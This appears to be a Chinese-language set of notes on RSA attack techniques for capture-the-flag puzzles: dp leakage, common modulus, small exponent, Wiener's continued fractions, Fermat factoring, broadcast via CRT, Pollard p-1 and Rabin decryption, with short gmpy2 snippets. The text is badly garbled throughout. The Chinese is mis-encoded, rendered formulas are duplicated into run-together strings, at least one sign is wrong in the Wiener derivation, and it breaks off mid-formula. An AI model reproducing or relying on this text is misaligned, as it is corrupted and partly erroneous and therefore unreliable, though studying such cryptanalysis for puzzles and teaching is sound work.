mpâ‰¡cdp+kâˆ—(qâˆ’1)âˆ—(râˆ’1)mod (qâˆ—r)m_p â‰¡ c^{d_p+k*(q-1)*(r-1)} \\mod (q*r)mpâ€‹â‰¡cdpâ€‹+kâˆ—(qâˆ’1)âˆ—(râˆ’1)mod(qâˆ—r) mpâ‰¡cdpâˆ—ckâˆ—(qâˆ’1)âˆ—(râˆ’1)mod (qâˆ—r)m_p â‰¡ c^{d_p}*c^{k*(q-1)*(r-1)} \\mod (q*r)mpâ€‹â‰¡cdpâ€‹âˆ—ckâˆ—(qâˆ’1)âˆ—(râˆ’1)mod(qâˆ—r) mpâ‰¡cdpmod (qâˆ—r)m_p â‰¡ c^{d_p} \\mod (q*r)mpâ€‹â‰¡cdpâ€‹mod(qâˆ—r) åŒç†å¯å¾— mqâ‰¡cdqmod (pâˆ—r)m_q â‰¡ c^{d_q} \\mod (p*r)mqâ€‹â‰¡cdqâ€‹mod(pâˆ—r) cdâ‰¡mp+kpâˆ—qâˆ—rc^d â‰¡ m_p+k_p*q*rcdâ‰¡mpâ€‹+kpâ€‹âˆ—qâˆ—r cdâ‰¡mq+kqâˆ—pâˆ—rc^d â‰¡ m_q+k_q*p*rcdâ‰¡mqâ€‹+kqâ€‹âˆ—pâˆ—r mp+kpâˆ—qâˆ—r=mq+kqâˆ—pâˆ—rm_p+k_p*q*r = m_q+k_q*p*rmpâ€‹+kpâ€‹âˆ—qâˆ—r=mqâ€‹+kqâ€‹âˆ—pâˆ—r mqâˆ’mp=(kpâˆ—qâˆ’kqâˆ—p)âˆ—rm_q-m_p = (k_p*q-k_q*p)*rmqâ€‹âˆ’mpâ€‹=(kpâ€‹âˆ—qâˆ’kqâ€‹âˆ—p)âˆ—r kpâˆ—qâˆ—râ‰¡mqâˆ’mpmod pk_p*q*r â‰¡ m_q-m_p \\mod pkpâ€‹âˆ—qâˆ—râ‰¡mqâ€‹âˆ’mpâ€‹modp kpâ‰¡(mqâˆ’mp)âˆ—qâˆ’1âˆ—râˆ’1mod pk_p â‰¡ (m_q-m_p)*q^{-1}*r^{-1} \\mod pkpâ€‹â‰¡(mqâ€‹âˆ’mpâ€‹)âˆ—qâˆ’1âˆ—râˆ’1modp cd=mp+kpâˆ—qâˆ—rc^d = m_p+k_p*q*rcd=mpâ€‹+kpâ€‹âˆ—qâˆ—r cd=mp+(((mqâˆ’mp)âˆ—qâˆ’1âˆ—râˆ’1)%p)âˆ—qâˆ—r+mpc^d = m_p+(((m_q-m_p)*q^{-1}*r^{-1})\\% p)*q*r+m_pcd=mpâ€‹+(((mqâ€‹âˆ’mpâ€‹)âˆ—qâˆ’1âˆ—râˆ’1)%p)âˆ—qâˆ—r+mpâ€‹ mâ‰¡cdmod nâ‰¡(((mqâˆ’mp)âˆ—qâˆ’1âˆ—râˆ’1)%p)âˆ—qâˆ—r+mpmod nm â‰¡ c^d \\mod n â‰¡ (((m_q-m_p)*q^{-1}*r^{-1})\\%p)*q*r+m_p \\mod nmâ‰¡cdmodnâ‰¡(((mqâ€‹âˆ’mpâ€‹)âˆ—qâˆ’1âˆ—râˆ’1)%p)âˆ—qâˆ—r+mpâ€‹modn mâ‰¡cdmod nâ‰¡((((cdq%(pâˆ—r))âˆ’(cdp%(qâˆ—r)))âˆ—qâˆ’1âˆ—râˆ’1)%p)âˆ—qâˆ—r+(cdp%(qâˆ—r))mod nm â‰¡ c^d \\mod n â‰¡ ((((c^{d_q}\\%(p*r))-(c^{d_p}\\%(q*r)))*q^{-1}*r^{-1})\\%p)*q*r+(c^{d_p}\\%(q*r)) \\mod nmâ‰¡cdmodnâ‰¡((((cdqâ€‹%(pâˆ—r))âˆ’(cdpâ€‹%(qâˆ—r)))âˆ—qâˆ’1âˆ—râˆ’1)%p)âˆ—qâˆ—r+(cdpâ€‹%(qâˆ—r))modn dp é€šè¿‡eee, dpd_pdpâ€‹, nnn, cccæ¥æ±‚è§£mmm eâˆ—dâ‰¡1mod (pâˆ’1)âˆ—(qâˆ’1)e*d â‰¡ 1 \\mod (p-1)*(q-1)eâˆ—dâ‰¡1mod(pâˆ’1)âˆ—(qâˆ’1) eâˆ—d=1+k1âˆ—(pâˆ’1)âˆ—(qâˆ’1)e*d = 1+ k_1*(p-1)*(q-1)eâˆ—d=1+k1â€‹âˆ—(pâˆ’1)âˆ—(qâˆ’1) eâˆ—(dp+k2âˆ—(pâˆ’1))=1+k1âˆ—(pâˆ’1)âˆ—(qâˆ’1)e*(d_p+k_2*(p-1)) = 1+ k_1*(p-1)*(q-1)eâˆ—(dpâ€‹+k2â€‹âˆ—(pâˆ’1))=1+k1â€‹âˆ—(pâˆ’1)âˆ—(qâˆ’1) eâˆ—dp+eâˆ—k2âˆ—(pâˆ’1)=1+k1âˆ—(pâˆ’1)âˆ—(qâˆ’1)e*d_p+e*k_2*(p-1) = 1 + k_1*(p-1)*(q-1)eâˆ—dpâ€‹+eâˆ—k2â€‹âˆ—(pâˆ’1)=1+k1â€‹âˆ—(pâˆ’1)âˆ—(qâˆ’1) eâˆ—dpâ‰¡1mod (pâˆ’1)e*d_p â‰¡ 1 \\mod (p-1)eâˆ—dpâ€‹â‰¡1mod(pâˆ’1) eâˆ—dpâˆ’1=kâˆ—(pâˆ’1)e*d_p-1 = k*(p-1)eâˆ—dpâ€‹âˆ’1=kâˆ—(pâˆ’1) k=eâˆ—dpâˆ’1pâˆ’1&lt;eâˆ—dppâˆ’1&lt;eâˆ—(pâˆ’1)pâˆ’1=ek = \\frac{e*d_p-1}{p-1} &lt; \\frac{e*d_p}{p-1} &lt; \\frac{e*(p-1)}{p-1} = ek=pâˆ’1eâˆ—dpâ€‹âˆ’1â€‹&lt;pâˆ’1eâˆ—dpâ€‹â€‹&lt;pâˆ’1eâˆ—(pâˆ’1)â€‹=e åˆ™å¯ä»¥éå†(2,eee) 123for i in range(2, e): if (e * d_p - 1) % i == 0: k = i p=eâˆ—dpâˆ’1k+1p = \\frac{e*d_p-1}{k} + 1p=keâˆ—dpâ€‹âˆ’1â€‹+1 q=npq = \\frac{n}{p}q=pnâ€‹ phi=(pâˆ’1)âˆ—(qâˆ’1)phi = (p-1)*(q-1)phi=(pâˆ’1)âˆ—(qâˆ’1) dâ‰¡eâˆ’1mod phid â‰¡ e^{-1} \\mod phidâ‰¡eâˆ’1modphi mâ‰¡cdmod nm â‰¡ c ^ d \\mod nmâ‰¡cdmodn å…±æ¨¡ {c1â‰¡me1mod nc2â‰¡me2mod n\\begin{cases} c_1 â‰¡ m^{e_1} \\mod n \\\\ c_2 â‰¡ m^{e_2} \\mod n \\\\ \\end{cases} {c1â€‹â‰¡me1â€‹modnc2â€‹â‰¡me2â€‹modnâ€‹ ç»™å‡ºc1c_1c1â€‹, c2c_2c2â€‹, e1e_1e1â€‹, e2e_2e2â€‹æ¥æ±‚è§£mmm gce(e1,e2)=1gce(e_1, e_2) = 1gce(e1â€‹,e2â€‹)=1 ä½¿ç”¨EEAå¯å¾— s1âˆ—e1+s2âˆ—e2=1s_1*e_1+s_2*e_2 = 1s1â€‹âˆ—e1â€‹+s2â€‹âˆ—e2â€‹=1 c1s1âˆ—c2s2â‰¡me1âˆ—s1âˆ—me2âˆ—s2â‰¡me1âˆ—s1+e2âˆ—s2â‰¡mmod nc_1^{s_1}*c_2^{s_2} â‰¡ m^{e_1*s_1}*m^{e_2*s_2} â‰¡ m^{e_1*s_1+e_2*s_2} â‰¡ m \\mod nc1s1â€‹â€‹âˆ—c2s2â€‹â€‹â‰¡me1â€‹âˆ—s1â€‹âˆ—me2â€‹âˆ—s2â€‹â‰¡me1â€‹âˆ—s1â€‹+e2â€‹âˆ—s2â€‹â‰¡mmodn ä½†æ˜¯s1s_1s1â€‹, s2s_2s2â€‹ä¸­æœ‰ä¸€ä¸ªä¸ºè´Ÿæ•° æ¨¡è¿ç®—çš„è´Ÿæ•°æ¬¡å¹‚è¿ç®—å¦‚ä¸‹ï¼ˆå‡è®¾s1s_1s1â€‹ä¸ºè´Ÿæ•°ï¼‰ c1s1â‰¡(c1âˆ’1)âˆ’s1mod nc_1^{s_1} â‰¡ (c_1^{-1})^{-s_1}\\mod nc1s1â€‹â€‹â‰¡(c1âˆ’1â€‹)âˆ’s1â€‹modn 1234567891011s = gmpy2.gcdext(e1, e2)if s[1] &lt; 0: s1 = -s[1] s2 = s[2] c1_ = gmpy2.invert(c1, n) m = (pow(c1_, s1, n) * pow(c2, s2, n)) % nelif s[2] &lt; 0: s1 = s[1] s2 = -s[2] c2_ = gmpy2.invert(c2, n) m = (pow(c1, s1, n) * pow(c2_, s2, n)) % n ä½æŒ‡æ•° eeeå¾ˆå°ï¼Œå­˜åœ¨ä¸¤ç§æƒ…å†µ c=me&lt;nc = m^e &lt; nc=me&lt;n åˆ™å¯ä»¥ç›´æ¥å¼€æ–¹ m=cem = \\sqrt[e]{c}m=ecâ€‹ c=me&gt;nc = m^e &gt; nc=me&gt;n c+kâˆ—n=mec+k*n = m^ec+kâˆ—n=me m=kâˆ—n+cem = \\sqrt[e]{k*n+c}m=ekâˆ—n+câ€‹ æšä¸¾kå³å¯è§£å‡ºæ˜æ–‡ 1234for i in range(0, 100): k = gmpy2.iroot(i * n + c, e) if k[1] == True: m = k[0] ä½è§£å¯†æŒ‡æ•° â€“ wiener ç†è®ºæ¨å¯¼éƒ¨åˆ†çœç•¥ ç»“è®ºä¸ºå½“ d&lt;13N14d &lt; \\frac{1}{3}N^{\\frac{1}{4}}d&lt;31â€‹N41â€‹ æˆç«‹æ—¶ âˆ£enâˆ’kdâˆ£&lt;12d2|\\frac{e}{n} - \\frac{k}{d}| &lt; \\frac{1}{2d^{2}}âˆ£neâ€‹âˆ’dkâ€‹âˆ£&lt;2d21â€‹ æˆç«‹ å…¶ä¸­ eâˆ—d=kâˆ—Ï•(n)+1e*d = k*\\phi(n) + 1eâˆ—d=kâˆ—Ï•(n)+1 åˆ™ kd\\frac{k}{d}dkâ€‹ çš„å€¼åœ¨ en\\frac{e}{n}neâ€‹çš„è¿åˆ†æ•°æ¸è¿›å€¼ä¸­å­˜åœ¨ ä»¥eee = 17993, nnn = 90581ä¸ºä¾‹ æ¬§å‡ é‡Œå¾—ç®—æ³•æµç¨‹å¦‚ä¸‹ 17993=0âˆ—90851+1799317993 = 0*90851 + 1799317993=0âˆ—90851+17993 90581=5âˆ—17993+61690581 = 5*17993 + 61690581=5âˆ—17993+616 17993=29âˆ—616+12917993 = 29*616 + 12917993=29âˆ—616+129 616=4âˆ—129+100616 = 4*129 + 100616=4âˆ—129+100 129=1âˆ—100+29129 = 1*100 + 29129=1âˆ—100+29 100=3âˆ—29+13100 = 3*29 + 13100=3âˆ—29+13 29=2âˆ—13+329 = 2*13 + 329=2âˆ—13+3 13=4âˆ—3+113 = 4*3 + 113=4âˆ—3+1 3=3âˆ—1+03 = 3*1 + 03=3âˆ—1+0 å¾—åˆ°çš„å•†æ•°é›†ä¸º [0,5,29,4,1,3,2,4,3][0, 5, 29, 4, 1, 3, 2, 4, 3][0,5,29,4,1,3,2,4,3] åˆ™ en\\frac{e}{n}neâ€‹ çš„è¿åˆ†æ•°å½¢å¼ä¸º 1799390581=0+15+129+14+11+13+12+14+13\\frac{17993}{90581} = 0+\\cfrac{1}{5+\\cfrac{1}{29+\\cfrac{1}{4+\\cfrac{1}{1+\\cfrac{1}{3+\\cfrac{1}{2+\\cfrac{1}{4+\\cfrac{1}{3}}}}}}}}9058117993â€‹=0+5+29+4+1+3+2+4+31â€‹1â€‹1â€‹1â€‹1â€‹1â€‹1â€‹1â€‹ å¯æ±‚å¾—è¿åˆ†æ•°æ¸è¿›å€¼ä¸º [0,15,29146,117589,146735,5552794,12566323,557928086,1799390581][0, \\frac{1}{5}, \\frac{29}{146}, \\frac{117}{589}, \\frac{146}{735}, \\frac{555}{2794}, \\frac{1256}{6323}, \\frac{5579}{28086}, \\frac{17993}{90581}][0,51â€‹,14629â€‹,589117â€‹,735146â€‹,2794555â€‹,63231256â€‹,280865579â€‹,9058117993â€‹] åˆ™éå†æ”¶æ•›å³å¯å¾—åˆ°(k,d)(k, d)(k,d)çš„å€¼ é€šè¿‡éŸ¦è¾¾å®šç†å¯ä»¥è¿›è¡Œè¿›ä¸€æ­¥çš„åˆ¤åˆ« n=pâˆ—qn = p*qn=pâˆ—q Ï•(n)=eâˆ—dâˆ’1k=(pâˆ’1)âˆ—(qâˆ’1)\\phi(n) = \\frac{e*d-1}{k} = (p-1)*(q-1)Ï•(n)=keâˆ—dâˆ’1â€‹=(pâˆ’1)âˆ—(qâˆ’1) nâˆ’Ï•(n)=p+qâˆ’1n - \\phi(n) = p+q-1nâˆ’Ï•(n)=p+qâˆ’1 è®¾ç«‹æ–¹ç¨‹å¼ x2+(nâˆ’Ï•(n)+1)âˆ—x+n=0x^2 + (n-\\phi(n)+1)*x + n = 0x2+(nâˆ’Ï•(n)+1)âˆ—x+n=0 x2+(p+q)âˆ—x+pâˆ—q=0x^2 + (p+q)*x + p*q = 0x2+(p+q)âˆ—x+pâˆ—q=0 å¦‚æœ (p+q)2âˆ’4âˆ—pâˆ—q=y&gt;0(p+q)^2 - 4*p*q = y &gt; 0(p+q)2âˆ’4âˆ—pâˆ—q=y&gt;0æˆç«‹ ä¸” y\\sqrt{y}yâ€‹ çš„ç»“æœä¸ºæ­£æ•´æ•° åˆ™dddä¸ºæ­£ç¡®å€¼ ä¸”å¯ä»¥æ±‚å‡ºppp, qqq è¡¥å…… âˆ£abâˆ’cdâˆ£&lt;12d2\\vert\\frac{a}{b} - \\frac{c}{d}\\vert &lt; \\frac{1}{2d^{2}}âˆ£baâ€‹âˆ’dcâ€‹âˆ£&lt;2d21â€‹ âˆ£abâˆ’cdâˆ£&lt;12b2\\vert\\frac{a}{b} - \\frac{c}{d}\\vert &lt; \\frac{1}{2b^{2}}âˆ£baâ€‹âˆ’dcâ€‹âˆ£&lt;2b21â€‹ åŒºåˆ«åœ¨äºå‰è€…åœ¨ab\\frac{a}{b}baâ€‹çš„è¶‹è¿‘å€¼ä¸­æ±‚cd\\frac{c}{d}dcâ€‹çš„å€¼ï¼Œåè€…åœ¨cd\\frac{c}{d}dcâ€‹çš„è¶‹è¿‘å€¼ä¸­æ±‚ab\\frac{a}{b}baâ€‹çš„å€¼ è´¹é©¬å› å¼åˆ†è§£ å¯¹äºä»»æ„ä¸€ä¸ªå¥‡æ•°nï¼Œæœ‰n=aâˆ—b=x2âˆ’y2=(x+y)âˆ—(xâˆ’y)n = a*b = x^2-y^2 = (x+y)*(x-y)n=aâˆ—b=x2âˆ’y2=(x+y)âˆ—(xâˆ’y) è€Œåœ¨nnnçš„åˆ†è§£å‡ºçš„å› æ•°æ¥è¿‘æ—¶ï¼Œå¯ä»¥ä» x=n+i,iâˆˆZx=\\sqrt{n}+i, i \\in{\\Bbb{Z}}x=nâ€‹+i,iâˆˆZ å¼€å§‹è¿›è¡Œé€’å¢éå† å¦‚æœx2âˆ’nx^2-nx2âˆ’nçš„ç»“æœå¯ä»¥è¢«å®Œå…¨å¼€æ–¹ï¼Œåˆ™xæ­£ç¡®ï¼Œä¸”å¼€æ–¹ç»“æœä¸ºy å³å¯å¾—å‡ºaaaï¼Œbbb è‹¥nnnä¸ºæœ‰å››ä¸ªå› å­ï¼Œåˆ™å­˜åœ¨ä¸¤ç»„aaaï¼Œbbbçš„å€¼ ä½æŒ‡æ•°å¹¿æ’­ {c1â‰¡memod n1c2â‰¡memod n2c3â‰¡memod n3\\begin{cases} c_1 â‰¡ m^e \\mod n_1 \\\\ c_2 â‰¡ m^e \\mod n_2 \\\\ c_3 â‰¡ m^e \\mod n_3 \\\\ \\end{cases} â©âªâ¨âªâ§â€‹c1â€‹â‰¡memodn1â€‹c2â€‹â‰¡memodn2â€‹c3â€‹â‰¡memodn3â€‹â€‹ ä¸”æ»¡è¶³ me&lt;n1âˆ—n2âˆ—n3m^e &lt; n_1*n_2*n_3me&lt;n1â€‹âˆ—n2â€‹âˆ—n3â€‹ åˆ™å¯ä»¥ä½¿ç”¨ä¸­å›½å‰©ä½™å®šç† {k1â‰¡(n2âˆ—n3)âˆ’1mod n1k2â‰¡(n1âˆ—n3)âˆ’1mod n2k3â‰¡(n1âˆ—n2)âˆ’1mod n3\\begin{cases} k_1 â‰¡ (n_2*n_3)^{-1} \\mod n_1 \\\\ k_2 â‰¡ (n_1*n_3)^{-1} \\mod n_2 \\\\ k_3 â‰¡ (n_1*n_2)^{-1} \\mod n_3 \\\\ \\end{cases} â©âªâ¨âªâ§â€‹k1â€‹â‰¡(n2â€‹âˆ—n3â€‹)âˆ’1modn1â€‹k2â€‹â‰¡(n1â€‹âˆ—n3â€‹)âˆ’1modn2â€‹k3â€‹â‰¡(n1â€‹âˆ—n2â€‹)âˆ’1modn3â€‹â€‹ me=(n2âˆ—n3âˆ—k1âˆ—c1+n1âˆ—n3âˆ—k2âˆ—c2+n1âˆ—n2âˆ—k3âˆ—c3)%(n1âˆ—n2âˆ—n3)m^e = (n_2*n_3*k_1*c_1+n_1*n_3*k_2*c_2+n_1*n_2*k_3*c_3)\\%(n_1*n_2*n_3)me=(n2â€‹âˆ—n3â€‹âˆ—k1â€‹âˆ—c1â€‹+n1â€‹âˆ—n3â€‹âˆ—k2â€‹âˆ—c2â€‹+n1â€‹âˆ—n2â€‹âˆ—k3â€‹âˆ—c3â€‹)%(n1â€‹âˆ—n2â€‹âˆ—n3â€‹) m=(n2âˆ—n3âˆ—k1âˆ—c1+n1âˆ—n3âˆ—k2âˆ—c2+n1âˆ—n2âˆ—k3âˆ—c3)%(n1âˆ—n2âˆ—n3)em = \\sqrt[e]{(n_2*n_3*k_1*c_1+n_1*n_3*k_2*c_2+n_1*n_2*k_3*c_3)\\%(n_1*n_2*n_3)}m=e(n2â€‹âˆ—n3â€‹âˆ—k1â€‹âˆ—c1â€‹+n1â€‹âˆ—n3â€‹âˆ—k2â€‹âˆ—c2â€‹+n1â€‹âˆ—n2â€‹âˆ—k3â€‹âˆ—c3â€‹)%(n1â€‹âˆ—n2â€‹âˆ—n3â€‹)â€‹ smooth number è‹¥p-1çš„ç´ å› å­å‡ä¸å¤§äºb é‚£ä¹ˆp-1ä¸º b-smooth number éå†ä¸å¤§äºbçš„ç´ æ•°aia_iaiâ€‹ B=âˆiaiB = \\prod_{i}{a_i}B=âˆiâ€‹aiâ€‹ åˆ™ B=kâˆ—(pâˆ’1)B = k*(p-1)B=kâˆ—(pâˆ’1) aBâ‰¡akâˆ—(pâˆ’1)â‰¡1mod pa^B â‰¡ a^{k*(p-1)} â‰¡ 1 \\mod paBâ‰¡akâˆ—(pâˆ’1)â‰¡1modp aBâ‰¡akâˆ—(pâˆ’1)â‰¡xmod na^B â‰¡ a^{k*(p-1)} â‰¡ x \\mod naBâ‰¡akâˆ—(pâˆ’1)â‰¡xmodn wikiä¸­ç»™å‡ºæ¨¡é™¤çš„è®¡ç®—æ–¹æ³•å¦‚ä¸‹ dmod (abc)=(dmod a)+a[(d/a)mod b]+ab[(d/a/b)mod c]d \\mod (abc) = (d \\mod a) + a[(d / a) \\mod b] + ab[(d / a / b) \\mod c]dmod(abc)=(dmoda)+a[(d/a)modb]+ab[(d/a/b)modc] aBâ‰¡akâˆ—(pâˆ’1)â‰¡xmod (pâˆ—q)a^B â‰¡ a^{k*(p-1)} â‰¡ x \\mod (p*q)aBâ‰¡akâˆ—(pâˆ’1)â‰¡xmod(pâˆ—q) aBâ‰¡akâˆ—(pâˆ’1)â‰¡xmod p+pâˆ—(xpmod q)a^B â‰¡ a^{k*(p-1)} â‰¡ x \\mod p + p*(\\frac{x}{p} \\mod q)aBâ‰¡akâˆ—(pâˆ’1)â‰¡xmodp+pâˆ—(pxâ€‹modq) aB=akâˆ—(pâˆ’1)=1+kâˆ—pa^B = a^{k*(p-1)} = 1 + k*paB=akâˆ—(pâˆ’1)=1+kâˆ—p gcd(aBâˆ’1,n)=gcd(kâˆ—p,qâˆ—p)=pgcd(a^{B}-1, n) = gcd(k*p, q*p) = pgcd(aBâˆ’1,n)=gcd(kâˆ—p,qâˆ—p)=p pï¼ˆéé¢„æœŸï¼‰ m&lt;pm &lt; pm&lt;p câ‰¡memod nc â‰¡ m^e \\mod ncâ‰¡memodn câ‰¡memod (pâˆ—q)c â‰¡ m^e \\mod (p*q)câ‰¡memod(pâˆ—q) cpâ‰¡meâ‰¡cmod pc_p â‰¡ m^e â‰¡ c \\mod pcpâ€‹â‰¡meâ‰¡cmodp eâˆ—dâ‰¡1mod (pâˆ’1)e*d â‰¡ 1 \\mod (p-1)eâˆ—dâ‰¡1mod(pâˆ’1) eâˆ—d=kâˆ—(pâˆ’1)+1e*d = k*(p-1)+1eâˆ—d=kâˆ—(pâˆ’1)+1 cpdâ‰¡meâˆ—dâ‰¡mkâˆ—(pâˆ’1)+1â‰¡mmod pc_p^d â‰¡ m^{e*d} â‰¡ m^{k*(p-1)+1} â‰¡ m \\mod pcpdâ€‹â‰¡meâˆ—dâ‰¡mkâˆ—(pâˆ’1)+1â‰¡mmodp d q=nextprime(p)q = nextprime(p)q=nextprime(p) eâˆ—dâ‰¡1mod phie*d â‰¡ 1 \\mod phieâˆ—dâ‰¡1modphi eâˆ—dâˆ’1=kâˆ—phie*d-1 = k*phieâˆ—dâˆ’1=kâˆ—phi eâˆ—dâˆ’1k=phi\\frac{e*d-1}{k} = phikeâˆ—dâˆ’1â€‹=phi æ ¹æ®eâˆ—dâˆ’1e*d-1eâˆ—dâˆ’1å’Œphiphiphiçš„ä½æ•°ä¹‹å·®å¯ä»¥å¾—åˆ°kkkçš„å¤§æ¦‚èŒƒå›´ åœ¨èŒƒå›´ä¸­éå†kkk å¾—åˆ°å¯èƒ½çš„phiphiphiå€¼ nextprime(phinextprime(\\sqrt{phi}nextprime(phiâ€‹) å³ä¸ºqqq p=phiqâˆ’1+1p = \\frac{phi}{q-1}+1p=qâˆ’1phiâ€‹+1 è®¡ç®— eâˆ—d % (pâˆ’1)âˆ—(qâˆ’1)e*d\\ \\%\\ (p-1)*(q-1)eâˆ—d % (pâˆ’1)âˆ—(qâˆ’1) çš„ç»“æœè‹¥ä¸º1 åˆ™ p,qp, qp,q å€¼æ­£ç¡®ï¼Œå³æ‰€å¾— phiphiphi å€¼æ­£ç¡® n &amp; ed eâˆ—d=kâˆ—phi+1e*d = k*phi + 1eâˆ—d=kâˆ—phi+1 k=eâˆ—dâˆ’1phi=eâˆ—dâˆ’1(pâˆ’1)âˆ—(qâˆ’1)&gt;eâˆ—dâˆ’1pâˆ—q=eâˆ—dâˆ’1nk = \\frac{e*d - 1}{phi} = \\frac{e*d - 1}{(p - 1)*(q - 1)} &gt; \\frac{e*d - 1}{p*q} = \\frac{e*d - 1}{n}k=phieâˆ—dâˆ’1â€‹=(pâˆ’1)âˆ—(qâˆ’1)eâˆ—dâˆ’1â€‹&gt;pâˆ—qeâˆ—dâˆ’1â€‹=neâˆ—dâˆ’1â€‹ nnnç•¥å¤§äºphiphiphi åˆ™kkkç•¥å¤§äºeâˆ—dâˆ’1n\\frac{e*d - 1}{n}neâˆ—dâˆ’1â€‹ çˆ†ç ´å³å¯å¾—åˆ°kkk phi=eâˆ—dâˆ’1k=(pâˆ’1)âˆ—(qâˆ’1)phi = \\frac{e*d - 1}{k} = (p - 1)*(q - 1)phi=keâˆ—dâˆ’1â€‹=(pâˆ’1)âˆ—(qâˆ’1) nâˆ’phi+1=pâˆ—qâˆ’(pâˆ’1)âˆ—(qâˆ’1)+1=p+qn - phi + 1= p*q - (p - 1)*(q - 1) + 1 = p + qnâˆ’phi+1=pâˆ—qâˆ’(pâˆ’1)âˆ—(qâˆ’1)+1=p+q pâˆ’q=(p+q)2âˆ’4âˆ—pâˆ—q=(p+q)2âˆ’4âˆ—np - q = (p + q)^{2} - 4*p*q = (p + q)^{2} - 4*npâˆ’q=(p+q)2âˆ’4âˆ—pâˆ—q=(p+q)2âˆ’4âˆ—n p=(p+q)+(pâˆ’q)2p = \\frac{(p + q)+(p - q)}{2}p=2(p+q)+(pâˆ’q)â€‹ q=(p+q)âˆ’(pâˆ’q)2q = \\frac{(p + q)-(p - q)}{2}q=2(p+q)âˆ’(pâˆ’q)â€‹ Rabin n=pâˆ—qn = p * qn=pâˆ—q câ‰¡m2mod nc â‰¡ m^{2} \\mod ncâ‰¡m2modn è¿™ç§æƒ…å†µä¸‹å³ä½¿å·²çŸ¥phiphiphiå’Œeeeï¼Œä¹Ÿä¸èƒ½é€šè¿‡æ­£å¸¸çš„æ–¹æ³•å»è§£å‡ºmmm ppp, qqqä¸ºç´ æ•°ï¼Œå³ä¸ºå¥‡æ•° åˆ™ (pâˆ’1)(p - 1)(pâˆ’1) å’Œ (qâˆ’1)(q - 1)(qâˆ’1) ä¸ºå‡ä¸ºå¶æ•° åˆ™phiphiphiä¸ºå¶æ•° gcd(phi,e)=2gcd(phi, e) = 2gcd(phi,e)=2 eeeåœ¨æ¨¡phiphiphiçš„æƒ…å†µä¸‹é€†å…ƒåˆ™ä¸å­˜åœ¨ è¿™é‡Œéœ€è¦ä½¿ç”¨Rabinç®—æ³•æ¥è¿›è¡Œè®¡ç®— å…¶æ ¸å¿ƒä¸ºäºŒæ¬¡å‰©ä½™ä»¥åŠä¸­å›½å‰©ä½™å®šç† câ‰¡m2mod nc â‰¡ m^{2} \\mod ncâ‰¡m2modn è¿™é‡Œå¯ä»¥åˆ†è§£ä¸ºä¸¤ä¸ªå¼å­ {cpâ‰¡m2â‰¡cmod pcqâ‰¡m2â‰¡cmod q\\begin{cases} c_{p} â‰¡ m^{2} â‰¡ c \\mod p \\\\ c_{q} â‰¡ m^{2} â‰¡ c \\mod q \\end{cases} {cpâ€‹â‰¡m2â‰¡cmodpcqâ€‹â‰¡m2â‰¡cmodqâ€‹ å¯¹äºç¬¬ä¸€ä¸ªå¼å­ cpâ‰¡m2mod pc_{p} â‰¡ m^{2} \\mod pcpâ€‹â‰¡m2modp åˆ™cccæ˜¯æ¨¡pppçš„äºŒæ¬¡å‰©ä½™ æ ¹æ®æ¬§æ‹‰åˆ¤åˆ«æ³•å¯ä»¥å¾—åˆ° cpâˆ’12â‰¡1mod pc^{\\frac{p - 1}{2}} â‰¡ 1 \\mod pc2pâˆ’1â€‹â‰¡1modp m2â‰¡câ‰¡câˆ—cpâˆ’12â‰¡cp+12mod pm^{2} â‰¡ c â‰¡ c * c^{\\frac{p - 1}{2}} â‰¡ c^{\\frac{p + 1}{2}} \\mod pm2â‰¡câ‰¡câˆ—c2pâˆ’1â€‹â‰¡c2p+1â€‹modp å¼€æ ¹å·å¾—åˆ°ä»¥ä¸‹ç»“æœ {c1â‰¡cp+14mod pc2â‰¡âˆ’cp+14â‰¡pâˆ’cp+14mod p\\begin{cases} c_{1} â‰¡ c^{\\frac{p + 1}{4}} \\mod p \\\\ c_{2} â‰¡ -c^{\\frac{p + 1}{4}} â‰¡ p - c^{\\frac{p + 1}{4}} \\mod p \\end{cases} {c1â€‹â‰¡c4p+1â€‹modpc2â€‹â‰¡âˆ’c4p+1â€‹â‰¡pâˆ’c4p+1â€‹modpâ€‹ å¯¹äºcæ¨¡qçš„æƒ…å†µåŒç† {c3â‰¡cq+14mod qc4â‰¡âˆ’cq+14â‰¡qâˆ’cq+14mod q\\begin{cases} c_{3} â‰¡ c^{\\frac{q + 1}{4}} \\mod q \\\\ c_{4} â‰¡ -c^{\\frac{q + 1}{4}} â‰¡ q - c^{\\frac{q + 1}{4}} \\mod q \\end{cases} {c3â€‹â‰¡c4q+1â€‹modqc4â€‹â‰¡âˆ’c4q+1â€‹â‰¡qâˆ’c4q+1â€‹modqâ€‹ å¯¹äºä»¥ä¸‹ç»„åˆåˆ†åˆ«è¿›è¡ŒCRT {c1&amp;c3c1&amp;c4c2&amp;c3c2&amp;c4\\begin{cases} c_{1} \\&amp; c_{3} \\\\ c_{1} \\&amp; c_{4} \\\\ c_{2} \\&amp; c_{3} \\\\ c_{2} \\&amp; c_{4} \\end{cases} â©âªâªâªâ¨âªâªâªâ§â€‹c1â€‹&amp;c3â€‹c1â€‹&amp;c4â€‹c2â€‹&amp;c3â€‹c2â€‹&amp;c4â€‹â€‹ kpâ‰¡qâˆ’1mod pk_{p} â‰¡ q^{-1} \\mod pkpâ€‹â‰¡qâˆ’1modp kqâ‰¡pâˆ’1mod qk_{q} â‰¡ p^{-1} \\mod qkqâ€‹â‰¡pâˆ’1modq {m1=qâˆ—kpâˆ—c1+pâˆ—kqâˆ—c3mod nm2=qâˆ—kpâˆ—c1+pâˆ—kqâˆ—c4mod nm3=qâˆ—kpâˆ—c2+pâˆ—kqâˆ—c3mod nm4=qâˆ—kpâˆ—c2+pâˆ—kqâˆ—c4mod n\\begin{cases} m_{1} = q*k_{p}*c_{1} + p*k_{q}*c_{3} \\mod n \\\\ m_{2} = q*k_{p}*c_{1} + p*k_{q}*c_{4} \\mod n \\\\ m_{3} = q*k_{p}*c_{2} + p*k_{q}*c_{3} \\mod n \\\\ m_{4} = q*k_{p}*c_{2} + p*k_{q}*c_{4} \\mod n \\end{cases} â©âªâªâªâ¨âªâªâªâ§â€‹m1â€‹=qâˆ—kpâ€‹âˆ—c1â€‹+pâˆ—kqâ€‹âˆ—c3â€‹modnm2â€‹=qâˆ—kpâ€‹âˆ—c1â€‹+pâˆ—kqâ€‹âˆ—c4â€‹modnm3â€‹=qâˆ—kpâ€‹âˆ—c2â€‹+pâˆ—kqâ€‹âˆ—c3â€‹modnm4â€‹=qâˆ—kpâ€‹âˆ—c2â€‹+pâˆ—kqâ€‹âˆ—c4â€‹modnâ€‹ mmmå°±å­˜åœ¨äºå››ç§ç»“æœä¹‹ä¸­ wilson (pâˆ’1)!â‰¡âˆ’1mod p(p-1)! 